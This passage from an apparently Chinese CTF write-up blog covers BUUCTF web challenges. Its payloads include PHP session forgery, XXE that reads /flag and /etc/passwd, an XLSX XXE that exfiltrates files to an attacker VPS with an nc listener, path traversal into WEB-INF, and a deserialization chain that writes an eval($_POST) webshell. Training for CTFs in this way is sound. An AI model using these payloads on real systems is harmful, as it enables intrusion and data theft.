<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">当 <span class="keyword">session</span>.serialize_handler=php 时，<span class="keyword">session</span>文件内容为： <span class="type">name</span>|s:<span class="number">7</span>:&quot;mochazz&quot;;</span><br><span class="line"></span><br><span class="line">当 <span class="keyword">session</span>.serialize_handler=php_serialize 时，<span class="keyword">session</span>文件为： a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;name&quot;;s:<span class="number">7</span>:&quot;mochazz&quot;;&#125;</span><br><span class="line"></span><br><span class="line">当 <span class="keyword">session</span>.serialize_handler=php_binary 时，<span class="keyword">session</span>文件内容为： 二进制字符names:<span class="number">7</span>:&quot;mochazz&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本地伪造文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;./&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>将得到的这个文件重命名为sess ,并进行sha256编码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hash_file(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&#x27;./sess&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span></span><br></pre></td></tr></table></figure>
<p>而下来要做的就是将这个sess文件上传了，上传点本地构造</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://85daafec-8582-4f39-b121-8ab733bdf710.node3.buuoj.cn/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;up_file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;attr&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;direction&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们可以下载一下这个文件，文件内容确实为我们伪造的damin</p>
<blockquote>
<p>POST:  direction=download&amp;attr=&amp;filename=sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
<p>这里注意要把cookie也改成432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
</blockquote>
<p>第二步就是 secret.txt 文件构造了</p>
<p><strong>对secret.txt 文件的判断是通过file_exists（）函数，</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">说明 ¶</span><br><span class="line">file_exists ( <span class="keyword">string</span> <span class="variable">$filename</span> ) : <span class="keyword">bool</span></span><br><span class="line">检查文件或目录是否存在。</span><br></pre></td></tr></table></figure>
<p><strong>虽然我们不能完全控制上传的文件名，但上传的路径我们是可以控制的，所以我们只需要在 /var/babyctf/ 下创建一个 success.txt 目录即可</strong></p>
<p>分析代码我们知道</p>
<blockquote>
<p> $dir_path = “/var/babyctf/“.$attr;  </p>
</blockquote>
<p>路径会拼接上 attr ,我也我们只需让attr为secret.txt  ,然后在该目录下上传我们之处创建的sess文件，伪造admin即可</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://85daafec-8582-4f39-b121-8ab733bdf710.node3.buuoj.cn/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;up_file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;attr&quot;</span> <span class="attr">value</span>=<span class="string">&quot;success.txt&quot;</span>&gt;</span>   </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;direction&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>获得flag</strong></p>
<p>然后回到刚才的界面内，改下<code>phpsessid</code>为<code>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code>，改<code>attr</code>对应的值为<code>success.txt</code>获得flag</p>
<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>知识点：XXE攻击</p>
<p><strong>当Web应用采用JSON进行数据传输时,可能存在XXE漏洞。</strong></p>
<p><strong>在该题，我们可以通过使用本地DTD文件来利用XXE漏洞实现任意结果输出</strong></p>
<p><strong>Blind XXE 需要使用到DTD约束自定义实体中的参数实体。参数实体是只能在DTD中定义和使用的实体，以 % 为标志定义，定义和使用方法如下</strong></p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE a[</span></span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY b <span class="meta-string">&quot;hello&quot;</span>&gt;</span>  //内部普通实体</span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xml.org/hhh.dtd&quot;</span>&gt;</span> //外部普通实体</span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///1234.dtd&quot;</span>&gt;</span> //外部参数实体</span></span><br><span class="line"><span class="perl">    %para;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><strong>而且参数实体还能嵌套定义,但需要注意的是,内层的定义的参数实体 % 需要进行HTML转义,否则会出现解析错误</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para</span> <span class="meta-string">&#x27;&lt;!ENTITY &amp;#x25; files SYSTEM &quot;file:///etc/passwd&quot;&gt;&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>该题我们引用的是linux system 本地的DT文件，路径如下</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamsa</span> <span class="meta-string">&#x27;Your DTD code&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="perl">%local_dtd;</span></span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">&#x27;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file &amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p><strong>知识点：XXE攻击</strong></p>
<p><strong>有waf ,通过修改编码方式绕过，将utf-8改为utf-16be</strong></p>
<p>放在user或者group标签下最多显示15位字符</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;file:///flag.txt&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后我们看一下User页面，发现其实还存在一个Intro标签,修改payload如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;file:///flag.txt&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">&lt;/users</span><br></pre></td></tr></table></figure>
<blockquote>
<p>cat 1.xml |iconv -f UTF-8 -t UTF-16BE &gt; payload.xml</p>
</blockquote>
<p>将得到的文件上传即可得到flag</p>
<p><strong>当然该题如果不知道 &lt;inctro&gt;时还可以利用报错的方式得到flag</strong></p>
<p>做法类似[GoogleCTF2019 Quals]Bnv</p>
<p>payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">&#x27;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file &amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %ISOamso;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>




<h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><p>知识点：</p>
<ol>
<li><strong>xlsx打xxe</strong></li>
<li><strong>java审计</strong></li>
<li><strong>目录穿越</strong></li>
</ol>
<p>记录下流程，不知道为什么用的buu内网VPS nc 反弹不上</p>
<p>1.随便上传文件，然后点下载，抓包。看到有filename，猜测可能存在目录穿越以及任意文件下载</p>
<p>2.尝试通过报错来获取网站的绝对路径，设置URL参数 filename=../</p>
<blockquote>
<p>可以看到javaweb的绝对路径爆出来了，由于也是第一次做javaweb的题，这里看了师傅们的wp，发现先去读取配置文件<code>web.xml</code>，看到三个class文件，下载下来，反编译用的 jd-gui</p>
</blockquote>
<blockquote>
<p>什么是web.xml？<br>一般的web工程中都会用到web.xml，web.xml主要用来配置，可以方便的开发web工程。web.xml主要用来配置Filter、Listener、Servlet等。但是要说明的是web.xml并不是必须的，一个web工程可以没有web.xml文件</p>
</blockquote>
<p>3.尝试读取web.xml文件，<a href="http://40faaff5-177e-4305-a31a-dbfb3de0adb8.node3.buuoj.cn/DownloadServlet?filename=../../../../WEB-INF/web.xml">http://40faaff5-177e-4305-a31a-dbfb3de0adb8.node3.buuoj.cn/DownloadServlet?filename=../../../../WEB-INF/web.xml</a>, 可以看到有三个class文件（因为不知道配置文件的具体位置就用…/来代替具体多少慢慢试）</p>
<p>4.把三个class文件下载下来，tomcat的class文件一般存储在/WEB-INF/classes/下面</p>
<p>filename=…/…/…/…/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class<br>filename=…/…/…/…/WEB-INF/classes/cn/abc/servlet/ListFileServlet.class<br>filename=…/…/…/…/WEB-INF/classes/cn/abc/servlet/ UploadServlet.class</p>
<p>jd-gui反编译</p>
<p>5.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">       &#123;</span><br><span class="line">           request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;\u7981\u6B62\u8BFB\u53D6&quot;</span>);</span><br><span class="line">           request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName))</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">        Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        System.out.println(sheet.getFirstRowNum());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(InvalidFormatException e)</span><br><span class="line">    &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ol start="6">
<li><p><del>百度搜 java excel 漏洞</del>，<a href="https://xz.aliyun.com/t/6996" target="_blank">Apache-Poi-XXE-Analysis</a></p>
</li>
<li><p>做法如下</p>
<p>新建一个空 excel-xxx.xlsx文件，将后缀改为zip</p>
<p>修改里面的[Content_Types].xml文件，在第二行添加如下代码</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://VPS的IP/file.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="perl">%remote;%int;%send;</span></span><br><span class="line"><span class="xml">]</span></span><br></pre></td></tr></table></figure>
<p>保存后，重新将后缀改为xlsx</p>
<p>接下去，buu建个小号，在linux-labs开个内网vps，xshell连上，在/var/www/html/目录下创建文件file.dtd，内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://VPS的内网IP:9999?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 开启监听</p>
<blockquote>
<p>nc -lvp 9999</p>
</blockquote>
</li>
</ol>
<p>上传 xlsx 文件，按理说应该被监听到的(f)，不知道为什么，失败了..</p>
<h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h2><p>知识点：</p>
<ol>
<li>死亡exit绕过</li>
<li>php后缀限制绕过</li>
<li>反序列化pop链</li>
</ol>
<p>代码分析就不写了，该题改编自 EIS 2019 的 ezpop</p>
<p>主要记录以下用到的几个知识点和新思路，和原题唯一不同之处就是对文件名做了限制，如下</p>
<p><strong>知识点一：通过 /../ 绕过文件名随机前缀，通过 /. 进行绕过文件名检验</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        <span class="variable">$cache_filename</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . uniqid() . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$cache_filename</span>, -strlen(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache_filename</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>$cache_filename=$this-&gt;options[&#39;prefix&#39;].uniqid().$name</code>组成随机的文件名。这里options[‘prefix’] 和 $name  可控。可以用../变成upload/1345235(uniqid)/../1.php 绕过**<br><strong>判断 $cache_filename 文件名最后三位是否是php结尾</strong><br><strong>这里可以用1.php/.绕过</strong></p>
<blockquote>
<p><strong>file_put_contents(‘1.php/.’,’123’)会生成1.php而不是1.php/.</strong></p>
</blockquote>
<blockquote>
<p><strong><code>$this-&gt;options[&#39;prefix&#39;] . uniqid() . $name</code>生成随机文件名uploads/48342/../1.php/.会在uploads目录生成1.php。</strong></p>
</blockquote>
<p><strong>知识点二：死亡exit 绕过</strong></p>
<blockquote>
<p>$data = “<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n” . $data;</p>
</blockquote>
<p>如何绕过p神的<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank">文章</a>讲的很详细了，不过这里作为笔记还是记录以下</p>
<p>我们可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$data</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
<p>，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>所以，当<code>$data</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">&#x27;/../shell.php/.&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="keyword">array</span>(<span class="string">&#x27;path&#x27;</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;dirname&#x27;</span>=&gt;base64_encode(<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span> = [</span><br><span class="line">        <span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&#x27;serialize&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A()));</span><br></pre></td></tr></table></figure>


<p>还有一种解法是直接在$data就是文件内容里直接写要仔细的命令，通过</p>
